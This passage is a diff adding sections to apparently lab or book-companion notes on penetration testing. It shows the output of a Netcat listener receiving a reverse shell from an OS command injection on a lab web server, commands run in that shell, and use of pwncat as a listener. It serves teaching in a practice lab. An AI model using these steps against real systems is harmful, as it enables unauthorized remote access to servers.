@@ -51,3 +51,46 @@ For example, we would deliver our single-line reverse shell payload by submittin
 
 
 ## Executing Commands
+After exploiting the OS command injection payload by submitting the payload in the Input field of the vulnerable webpage,<br>
+you should see the following in the terminal window where the Netcat listener is running: 
+```
+--snip--
+listening on [any] 1337 ...
+172.16.10.12: inverse host lookup failed: Unknown host
+connect to [172.16.10.1] from (UNKNOWN) [172.16.10.12] 40318
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@p-web-02:/var/www/html$ 
+--snip--
+```
+
+You now have a reverse shell running. Test it out by running commands. Example:
+```
+www-data@p-web-02:/var/www/html$ uname -a
+uname -a
+Linux p-web-02.acme-infinity-servers.com 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.18.12-1kali1 (2026-02-25) x86_64 GNU/Linux
+www-data@p-web-02:/var/www/html$ 
+```
+
+
+## Listening with Pwncat
+Pwncat is another great alternative utility for capturing and interacting with reverse shells.<br>
+Try creating a reverse shell listener and test the variety of Pwncat's built-in modules.
+
+> ### *NOTE*
+> The book uses *pwncat-cs*, which is a community managed version of pwncat with additional features.
+> However, it does not appear to work or be maintained anymore.
+> The alternative is to use base *pwncat* or install a community managed fork of pwncat-cs, called [*pwncat-vl*](https://github.com/Chocapikk/pwncat-vl).
+> Pwncat-vl can be installed with the following command:
+> `pipx install git+https://github.com/Chocapikk/pwncat-vl`
+
+
+###### Start a pwncat reverse shell listener
+```
+pwncat -l 1337
+
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@p-web-02:/var/www/html$
+```
+
